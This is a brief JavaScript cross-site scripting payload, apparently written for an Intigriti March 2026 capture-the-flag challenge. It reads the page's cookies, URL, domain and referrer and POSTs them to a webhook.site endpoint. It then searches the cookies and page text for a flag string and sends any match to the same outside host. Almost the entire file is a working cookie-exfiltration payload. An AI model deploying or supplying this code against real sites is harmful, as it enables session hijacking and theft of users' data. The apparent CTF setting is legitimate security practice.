// Intigriti March 2026 XSS Payload
alert("🎉 XSS Success! Intigriti March Challenge");

console.log("Cookies:", document.cookie);

// Send everything to your webhook
fetch("https://webhook.site/66e746ee-1738-4e81-8a1c-28d729ae6f31/exfil", {
    method: "POST",
    body: JSON.stringify({
        cookies: document.cookie,
        url: location.href,
        domain: document.domain,
        referrer: document.referrer
    }),
    headers: { "Content-Type": "application/json" }
});

// Try to find and steal the flag
setTimeout(() => {
    let flag = 
        document.cookie.match(/flag=([^;]+)/i)?.[1] ||
        document.cookie.match(/INTIGRITI\{[^}]+\}/i)?.[0] ||
        document.body.innerText.match(/INTIGRITI\{[^}]+\}/i)?.[0];

    if (flag) {
        alert("🚩 FLAG FOUND:\n" + flag);
        
        fetch("https://webhook.site/66e746ee-1738-4e81-8a1c-28d729ae6f31/flag", {
            method: "POST",
            body: "flag=" + encodeURIComponent(flag)
        });
    }
}, 800);